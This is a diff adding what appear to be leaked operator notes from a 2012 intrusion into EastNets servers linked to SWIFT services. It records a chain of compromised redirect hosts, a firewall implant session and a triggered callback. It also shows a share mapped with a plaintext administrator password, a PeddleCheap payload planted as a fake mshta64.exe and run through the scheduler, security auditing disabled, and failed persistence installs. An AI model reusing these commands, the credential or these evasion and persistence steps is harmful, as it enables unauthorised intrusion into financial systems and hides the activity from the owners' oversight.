@@ -1,0 +1,304 @@
+ISP:	LK
+City:	
+Phone:	
+ISP IP:	69.64.59.133
+Source IP:	
+FINAL target IP:	
+Ops Machine:	LOCALHOST.LOCALDOMAIN
+Redirecting Method 1:	PITCHIMPAIR
+Redirect Host 1:	212.19.128.4
+Redirect Target 1:	80.227.254.202
+Redirecting Method 2:	INCISION
+Redirect Host 2:	80.227.254.202
+Redirect Target 2:	192.168.206.110
+Redirecting Method 3:	INCISION
+Redirect Host 3:	192.168.206.110
+Redirect Target 3:	192.168.200.51
+
+
+BEGIN UNIX OPNOTES:
+
+Targets (IP, full domain name, target tags: pitchimpair unsuccessful not_attempted ) : 
+--> 212.19.128.4           ns.itte.kz                     pitchimpair          unix      successful    
+---> 80.227.254.202        ensbdvpn1.festivalcity.net.ae  jeepflea_market      firewall  successful    
+----> 192.168.206.110      ensbdmgmt1.eastnets.com        jeepflea_market      windows   successful    
+-----> 192.168.200.51      ensbdsl1.eastnets.com          jeepflea_market      windows   successful    
+Ops Machine: WO-CBX-LSR
+Results:
+
+==============
+212.19.128.4
+==============
+2012-07-02 19:10:51 UTC - ourtn -eY5U /current/up/noserver -wBIN 212.19.128.4
+2012-07-02 19:11:12 UTC - 1:11am  up 384 day(s),  8:08,  0 users,  load average: 0.12, 0.12, 0.12
+			  Tue Jul  3 01:11:22 GMT-6 2012
+			  Mon Jul  2 19:11:22 GMT 2012
+2012-07-02 19:13:27 UTC - checks good, moving on...
+
+-tunnel
+u 12742 80.227.254.202 12742 21385
+
+2012-07-02 21:52:48 UTC - bb
+
+=================
+80.227.254.202
+=================
+./BLIAR-2110 --lp 127.0.0.1 --implant 127.0.0.1 --idkey /current/bin/FW/OPS/jeepflea_market_80.227.254.202.ssg500.6.2.0r6.0.1341250568.key --sport 21385 --dport 12742
+2012-07-02 19:29:26 UTC - opened session with FW
+2012-07-02 19:29:32 UTC - uploading pktlk
+2012-07-02 19:31:24 UTC - created and opened tunnels
+
+                 ------------------Attacker------------------
+                         |                          ^
+                         v                          |
+     Attacker to Firewall Packet             Firewall to Attacker Packet
+     Source IP  :  212.19.128.4___           Source IP  :  80.227.254.201_
+     Dest   IP  :  80.227.254.201_           Dest   IP  :  212.19.128.4___
+     Source Port:  _____                     Source Port:  _____
+     Dest   Port:  _____                     Dest   Port:  _____
+                         |                          ^
+                         v   Iface Num: 1_______    |
+          -------------------------Firewall-------------------------
+                         |   Iface Num: 1_______    ^
+                         v                          |
+     Firewall to Target Packet               Target to Firewall Packet
+     Source IP  :  192.168.206.4__           Source IP  :  192.168.206.110
+     Dest   IP  :  192.168.206.110           Dest   IP  :  192.168.206.4__
+     Source Port:  _____                     Source Port:  _____
+     Dest   Port:  _____                     Dest   Port:  _____
+                         |                          ^
+                         v                          |
+                 -------------------Target-------------------
+
+2012-07-02 21:50:47 UTC - closed and removed tunnel
+2012-07-02 21:52:40 UTC - exited session
+
+
+PROJECT=JEEPFLEA_MARKET
+OPUSER=28366
+OPSCHEDULE=12062912151349
+SCRUBVER=6.006000029
+
+
+
+
+
+LOCALHOST.LOCALDOMAIN: scrubhands v. 6.006000029 20120702-1839
+###################
+SCRUBHANDS v6.006000029 (suite v6.6.0.29 run in /192.168.254.71) command line:
+:
+/usr/local/bin/scrubhands -t -S 12062912151349 -I 28366 -p JEEPFLEA_MARKET -n 69.64.44.50,69.64.44.20 69.64.59.133
+###################
+Final lines of bwmonitor.txt:
+
+Mon Jul  2 21:53:27 UTC 2012
+          RX packets:28141 errors:0 dropped:0 overruns:0 frame:0
+          RX bytes:9845872 (9.3 MiB)  TX bytes:10013872 (9.5 MiB)
+
+###################################################
+Project: JEEPFLEA_MARKET
+Date: 7:13 PM 7/2/2012
+
+### Lines to assist in automated processing
+# Un-comment the "Op Status" line (the line immediately below this one) to mark this op as unsuccessful
+#Op Status: Unsuccessful
+# Un-comment the "Non-Standard" line (the line immediately below this one) to mark this op as a non-standard
+#Non-Standard: True
+
+###################################################
+Targets:
+
+
+
+Results:
+
+================
+192.168.206.110
+================
+7:37 PM 7/2/2012 -           ----====**** CORDIALFLIMSY TRIGGER BEGIN ****====----
+		Target Address    : 80.227.254.201
+		Source Address    : 212.19.128.4
+		Target Protocol   : ICMP
+		ICMP type,code    : 8,0
+		Keyfile           : D:\DSZOPSDisk\Resources\Pc\Keys\jeepflea_market\private_key.bin
+		Callback Address  : 192.168.206.4
+		Callback Dst Port : 34519
+		Callback Src Port : 0
+		Redirect through  : 192.168.254.71:555
+		Final Destination : 192.168.208.10
+		Id                : 0x0000000100010c30
+		Packet Trailer    : 0x3f46
+7:39 PM 7/2/2012 - win2k8 sp2
+7:39 PM 7/2/2012 - Uptime: 12 days, 19 hours, 14 minutes, 22 seconds
+		   Idle  : 12 days, 19 hours, 14 minutes, 25 seconds
+7:41 PM 7/2/2012 - unknown procs:
+D:\Program Files\Symantec\Backup Exec | LUGetUpdatesExe.exe -belongs to product Symantec Backup Exec? for Windows Servers 
+other unknown procs, previously researched.
+7:43 PM 7/2/2012 - PSP: Symantec Endpoint Protection | Symantec Corporation | 11.0.6005.562
+7:44 PM 7/2/2012 - Security auditing has been dorked.
+7:51 PM 7/2/2012 - winsurvey done, hour clean
+9:41 PM 7/2/2012 - final hour clean 
+9:46 PM 7/2/2012 - q & d
+
+
+
+
+
+==================
+192.168.200.51
+==================
+7:53 PM 7/2/2012 - ping timed out
+7:53 PM 7/2/2012 - ENSBDSL1            UNIQUE REGISTERED        Workstation Service
+	WORKGROUP           GROUP REGISTERED         Domain Name
+	ENSBDSL1            UNIQUE REGISTERED        File Server Service
+7:54 PM 7/2/2012 - NativeOS: Windows Server 2008 R2 Standard 7600
+7:56 PM 7/2/2012 - gonna try to ZB this guy
+7:56 PM 7/2/2012 - shares -target 192.168.200.51 -map C$ -credentials administrator ^enSBSX11^ "" -method netuse
+7:58 PM 7/2/2012 - unknown procs from pulist
+HV_Service.exe - Hypervisor Boot Driver by Microsoft
+8:14 PM 7/2/2012 - putting egg up on targ
+put D:\Logs\jeepflea_market\z0.0.0.1\Payloads\PeddleCheap_2012_07_02_20h00m10s\PC_Level3_exe.configured -name \\192.168.200.51\C$\windows\syswow64\mshta64.exe -permanent 
+scheduler -add 2 C:\windows\syswow64\mshta64.exe -target 192.168.200.51
+8:16 PM 7/2/2012 - BOOM!, got the callback
+8:17 PM 7/2/2012 - WIN2k8 sp 0 
+8:17 PM 7/2/2012 - Uptime: 11 days, 0 hours, 27 minutes, 55 seconds
+		   Idle  : 11 days, 0 hours, 27 minutes, 56 seconds
+8:18 PM 7/2/2012 - unknown procs:
+C:\Program Files (x86)\TurboFTP | TurboFTP.exe - TurboSoft, Inc. belonging to product TurboFTP Application.
+C:\Program Files (x86)\Symantec\Symantec Endpoint Protection | ProtectionUtilSurrogate.exe - related to Symantec
+D:\Double-Take\Service | CoreManagementService.exe - related to SWIFT service
+D:\Double-Take | DoubleTake.exe - Related to SWIFT services
+D:\Double-Take\Hyper-V | HV_Service.exe - Hypervisor Boot Driver by Microsoft
+8:23 PM 7/2/2012 - PSP:
+| Symantec Backup Exec Remote Agent for Windows Systems | Symantec Corporation |   12.5.2213   |
+|             Symantec Endpoint Protection              | Symantec Corporation | 11.0.6005.562 |
+|         LiveUpdate 3.3 (Symantec Corporation)         | Symantec Corporation |   3.3.0.96    |
+8:23 PM 7/2/2012 - Security auditing has been dorked.
+8:25 PM 7/2/2012 - unknown drivers:
+\SystemRoot\system32\DRIVERS | RepHsm.sys - belongs to product Double-Take, HSM Minifilter
+\SystemRoot\system32\DRIVERS | RepDac.sys - belongs to Double-Take, Access Minifilter
+\SystemRoot\system32\DRIVERS | RepDrv.sys - belongs to Double-Take, Replication Minifilter
+\SystemRoot\system32\DRIVERS | RepKap.sys - belongs to Double-Take, Kernel Access Provider Minifilter (x86).
+8:31 PM 7/2/2012 - - Memory Load       : 17%%
+8:33 PM 7/2/2012 - winsurvey done, hour clean
+9:06 PM 7/2/2012 - trying to install with KISU and FLAV
+9:06 PM 7/2/2012 - wtf....just dropped connection while trying to install...no bueno
+9:11 PM 7/2/2012 -  Security auditing has been dorked.
+9:13 PM 7/2/2012 - trying install one more time...blew up again
+9:14 PM 7/2/2012 - back up again
+9:20 PM 7/2/2012 - KISU_config=
+- KiSu Id:  0x7a43e1fa (PC)
+- Version:  2.1.8.8
+- Kernel Module Loader:
+-     Registry Key:  \registry\machine\SYSTEM\CurrentControlSet\Services\viaide\Parameters
+-     Registry Value:  {ECC6AAA2-D4B1-9937-2A3A-017CE482A890}
+- User Module Loader:
+-     Registry Key:  
+-     Registry Value:  
+- Module Store Directory:
+-     Registry Key:  \registry\machine\SYSTEM\CurrentControlSet\Services\ql2300\Parameters
+-     Registry Value:  {33A51B15-8DE5-3F99-1375-A07D75741CDF}
+- Launcher:
+-     Service Name:  secdrv
+-     Registry Value:  {ECC6AAA2-D4B1-9937-2A3A-017CE482A890}
+- 
+- Module Id         Size       Order      Flags    Name        Process
+- =====================================================================
+- 0xab3f907f       85504           0      U  EC    UserModuleLoader 64-Bit  
+- 0xbb397f34          20           0         ECL   Persistence Identifier  
+- 0xbb397f32       83456           0      U  EC    UserModuleLoader 32-Bit  
+- 0xbb397f33       83968           0    AD   EC    BroughtHotshot  
+-     B: BootStart,  S: SystemStart, A: AutoStart,      D: KernelDriver
+-     U: UserMode,   R: SystemMode,  K: ServiceKey,     E: Encrypted
+-     C: Compressed, L: DemandLoad,  O: AutoStart Once		
+
+9:20 PM 7/2/2012 - install failed :
+* File: D:\DSZOPSDisk\Resources\Pc\Scripts\Install\winnt\_Install.dss |  Line: 354
+*    Script terminated while running IF
+
+* File: D:\DSZOPSDisk\Resources\Pc\Scripts\Install\winnt\_Install.dss |  Line: 352
+*    Script terminated while running IF
+
+* File: D:\DSZOPSDisk\Resources\Pc\Scripts\Install\winnt\_Install.dss |  Line: 350
+*    Script terminated while running IF
+
+* File: D:\DSZOPSDisk\Resources\Dsz\Scripts\Include\_Menu.dsi |  Line: 382
+*    Failed to get first value for compare.
+
+* File: D:\DSZOPSDisk\Resources\Dsz\Scripts\Include\_Menu.dsi |  Line: 512
+*    Failed to get first value for compare.
+
+* File: D:\DSZOPSDisk\Resources\Dsz\Scripts\Include\_Menu.dsi |  Line: 476
+*    Script terminated while running IF
+
+* File: D:\DSZOPSDisk\Resources\Dsz\Scripts\Include\_Menu.dsi |  Line: 404
+*    Script terminated while running WHILE
+
+* File: D:\DSZOPSDisk\Resources\Pc\Scripts\Install\winnt\_Install.dss |  Line: 104
+*    Failed to get first value for compare.
+* Failed to run code!
+
+9:20 PM 7/2/2012 - trying one last time with no flav
+9:22 PM 7/2/2012 - tried connecting to KISU during install,
+* File: D:\DSZOPSDisk\Resources\Pc\Scripts\Install\winnt\_Install.dss |  Line: 518
+*    Script terminated while running IF
+
+* File: D:\DSZOPSDisk\Resources\Dsz\Scripts\Include\_Menu.dsi |  Line: 382
+*    Failed to get first value for compare.
+
+* File: D:\DSZOPSDisk\Resources\Dsz\Scripts\Include\_Menu.dsi |  Line: 512
+*    Failed to get first value for compare.
+
+* File: D:\DSZOPSDisk\Resources\Dsz\Scripts\Include\_Menu.dsi |  Line: 476
+*    Script terminated while running IF
+
+* File: D:\DSZOPSDisk\Resources\Dsz\Scripts\Include\_Menu.dsi |  Line: 404
+*    Script terminated while running WHILE
+
+* File: D:\DSZOPSDisk\Resources\Pc\Scripts\Install\winnt\_Install.dss |  Line: 104
+*    Failed to get first value for compare.
+* Failed to run code!
+
+
+9:29 PM 7/2/2012 - cutting my losses, q&d
+
+
+100011972
+
+
+
+
+####
+# Lines to assist in techsums
+# NOTEs and ERRORs will automatically generate a techsum
+# You can also enclose any portion of your opnotes in a <TECHSUM> </TECHSUM> block to have that section be included in the
+#   techsum automatically.  Like so:
+# <TECHSUM>
+# Bad things happened.
+# Then more bad things happened.
+# Then it _really_ got bad.
+# </TECHSUM>
+#  Please keep the <TECHSUM> and </TECHSUM> on separate lines
+#  Um...also, those angle brackets (< and >) are actually there, unlike the formats below
+####
+
+###################################################
+#
+# Create lines like the following (without #) to create targetnotes files
+# Targetnotes files are found in the <target IP> directory as targetnotes.txt; you can also create them directly.
+# They will be read to automate actions in future ops.
+#
+# General note to operators
+#NOTE (<target IP>): <here is my note>
+#
+# Do not run this command (it will cause problems on this box)
+#DONOTRUN (<target IP>): <command>
+#
+# This command caused an error (bring it to the attention of the developer)
+#ERROR (<target IP>): <command> <optional: what happened>
+#
+# This process runs all the time and is harmless
+#IGNORE (<target IP>): <executable name>
+#
+# This process was identified
+#ID: <process>=<label>
